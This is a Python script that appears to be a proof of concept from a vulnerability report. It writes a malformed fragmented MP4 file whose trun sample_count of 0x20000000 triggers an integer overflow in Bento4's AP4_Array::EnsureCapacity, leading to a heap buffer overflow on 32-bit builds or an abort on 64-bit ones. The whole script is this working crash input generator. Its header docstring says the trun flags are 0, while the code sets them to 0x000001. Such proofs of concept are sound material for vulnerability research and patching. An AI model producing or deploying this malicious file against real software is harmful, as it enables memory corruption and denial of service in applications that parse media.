#!/usr/bin/env python3
"""
VULN 001 PoC Generator
Integer overflow in AP4_Array::EnsureCapacity -> heap buffer overflow
in AP4_FragmentSampleTable::AddTrun (32-bit) / std::bad_alloc (64-bit)

Constructs a fragmented MP4 with trun sample_count=0x20000000 and flags=0
(no per-sample fields), triggering the overflow in EnsureCapacity.
"""
import struct
import os

# Output path
OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


def box(box_type, payload):
    """Build a box: 4-byte big-endian size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode("ascii") + payload


def fullbox(box_type, version, flags, payload):
    """Build a FullBox: box with version(1B) + flags(3B) header."""
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)


def build_ftyp():
    payload = b"mp42"          # major brand
    payload += struct.pack(">I", 0)  # minor version
    payload += b"mp42"         # compatible brand
    return box("ftyp", payload)


def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)   # creation, modification, timescale, duration
    payload += struct.pack(">I", 0x00010000)          # rate = 1.0
    payload += struct.pack(">H", 0x0100)              # volume = 1.0
    payload += b"\x00" * 10                           # reserved
    # Unity matrix
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b"\x00" * 24                           # pre_defined
    payload += struct.pack(">I", 2)                   # next_track_id
    return fullbox("mvhd", 0, 0, payload)


def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)  # creation, modification, track_id, reserved, duration
    payload += b"\x00" * 8                            # reserved
    payload += struct.pack(">hhhh", 0, 0, 0, 0)      # layer, alt_group, volume, reserved
    # Unity matrix
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)               # width, height
    return fullbox("tkhd", 0, 0x000003, payload)


def build_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)   # creation, modification, timescale, duration
    payload += struct.pack(">HH", 0x55C4, 0)          # language=undetermined, pre_defined
    return fullbox("mdhd", 0, 0, payload)


def build_hdlr():
    payload = struct.pack(">I", 0)                    # pre_defined
    payload += b"soun"                                # handler_type
    payload += b"\x00" * 12                           # reserved
    payload += b"\x00"                                # name (null terminated empty string)
    return fullbox("hdlr", 0, 0, payload)


def build_smhd():
    payload = struct.pack(">HH", 0, 0)               # balance, reserved
    return fullbox("smhd", 0, 0, payload)


def build_dinf():
    # url entry: self-contained
    url_payload = struct.pack(">B", 0) + b"\x00\x00\x01"  # version=0, flags=1 (self-contained)
    url_entry = box("url ", url_payload)
    # dref
    dref_payload = struct.pack(">I", 1) + url_entry   # entry_count=1
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)


def build_stbl():
    stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))     # entry_count=0
    stts = fullbox("stts", 0, 0, struct.pack(">I", 0))     # entry_count=0
    stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))     # entry_count=0
    stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0)) # sample_size=0, sample_count=0
    stco = fullbox("stco", 0, 0, struct.pack(">I", 0))     # entry_count=0
    return box("stbl", stsd + stts + stsc + stsz + stco)


def build_minf():
    smhd = build_smhd()
    dinf = build_dinf()
    stbl = build_stbl()
    return box("minf", smhd + dinf + stbl)


def build_mdia():
    mdhd = build_mdhd()
    hdlr = build_hdlr()
    minf = build_minf()
    return box("mdia", mdhd + hdlr + minf)


def build_trak():
    tkhd = build_tkhd()
    mdia = build_mdia()
    return box("trak", tkhd + mdia)


def build_moov():
    mvhd = build_mvhd()
    trak = build_trak()
    return box("moov", mvhd + trak)


def build_mfhd():
    payload = struct.pack(">I", 1)   # sequence_number=1
    return fullbox("mfhd", 0, 0, payload)


def build_tfhd():
    # flags=0x000000: no optional fields, simplest form
    payload = struct.pack(">I", 1)   # track_id=1
    return fullbox("tfhd", 0, 0x000000, payload)


def build_trun():
    # flags=0x000001: data_offset present; no per-sample fields
    # sample_count=0x20000000: the triggering overflow value
    SAMPLE_COUNT = 0x20000000
    payload = struct.pack(">I", SAMPLE_COUNT)  # sample_count
    payload += struct.pack(">i", 8)            # data_offset (points just past mdat header)
    return fullbox("trun", 0, 0x000001, payload)


def build_traf():
    tfhd = build_tfhd()
    trun = build_trun()
    return box("traf", tfhd + trun)


def build_moof():
    mfhd = build_mfhd()
    traf = build_traf()
    return box("moof", mfhd + traf)


def build_mdat():
    # Minimal mdat: just the box header, no actual media data
    return box("mdat", b"")


def main():
    ftyp = build_ftyp()
    moov = build_moov()
    moof = build_moof()
    mdat = build_mdat()

    mp4_data = ftyp + moov + moof + mdat

    with open(OUT_FILE, "wb") as f:
        f.write(mp4_data)

    print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
    print(f"[+] trun sample_count=0x20000000, flags=0x000001 (data_offset only)")
    print(f"[+] Expected: integer overflow in AP4_Array::EnsureCapacity on 32-bit")
    print(f"[+]           std::bad_alloc / abort on 64-bit ASAN build")


if __name__ == "__main__":
    main()
